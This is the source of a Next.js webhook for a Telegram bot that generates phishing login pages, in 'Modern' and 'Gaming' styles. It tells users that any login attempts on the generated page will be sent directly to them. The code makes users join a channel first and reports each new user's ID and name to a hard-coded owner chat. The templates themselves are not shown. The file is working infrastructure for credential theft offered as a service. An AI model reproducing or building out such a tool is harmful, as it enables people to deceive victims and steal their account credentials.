import { NextResponse } from "next/server"

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const CHANNEL_USERNAME = "@SG_Modder1"
const OWNER_CHAT_ID = "1249726999"

async function checkUserInChannel(userId: number) {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/getChatMember?chat_id=${CHANNEL_USERNAME}&user_id=${userId}`,
    )
    const data = await response.json()
    return data.ok && ["creator", "administrator", "member"].includes(data.result.status)
  } catch (error) {
    console.error("Error checking channel membership:", error)
    return false
  }
}

async function sendMessage(chatId: number | string, text: string, keyboard?: any) {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: "HTML",
      reply_markup: keyboard,
    }),
  })
}

export async function POST(req: Request) {
  try {
    const data = await req.json()
    const { message, callback_query } = data

    if (callback_query) {
      const callbackChatId = callback_query.message.chat.id
      const pageType = callback_query.data
      const baseUrl = process.env.VERCEL_URL || "http://localhost:3000"
      const pageUrl = `https://${baseUrl}/${pageType}?id=${callbackChatId}`

      await sendMessage(
        callbackChatId,
        `✨ Here's your generated login page:\n\n${pageUrl}\n\n🔒 Any login attempts will be sent directly to you.`,
      )
      return NextResponse.json({ ok: true })
    }

    if (!message) {
      return NextResponse.json({ ok: true })
    }

    const chatId = message.chat.id
    const userId = message.from.id
    const text = message.text

    // Inform bot owner about new user
    if (text === "/start") {
      await sendMessage(
        OWNER_CHAT_ID,
        `🚀 New user started the bot!\n\nUser ID: ${userId}\nUsername: @${message.from.username || "N/A"}\nName: ${message.from.first_name} ${message.from.last_name || ""}`,
      )
    }

    // Check if user is in the channel
    const isInChannel = await checkUserInChannel(userId)

    if (!isInChannel) {
      await sendMessage(chatId, `⚠️ Please join our channel ${CHANNEL_USERNAME} first to use this bot!`)
      return NextResponse.json({ ok: true })
    }

    // Handle /start command
    if (text === "/start") {
      const keyboard = {
        inline_keyboard: [
          [{ text: "Create Modern Login Page", callback_data: "page1" }],
          [{ text: "Create Gaming Login Page", callback_data: "page2" }],
        ],
      }
      await sendMessage(chatId, "👋 Welcome! Choose a login page template to generate:", keyboard)
    }

    return NextResponse.json({ ok: true })
  } catch (error) {
    console.error("Error processing webhook:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}

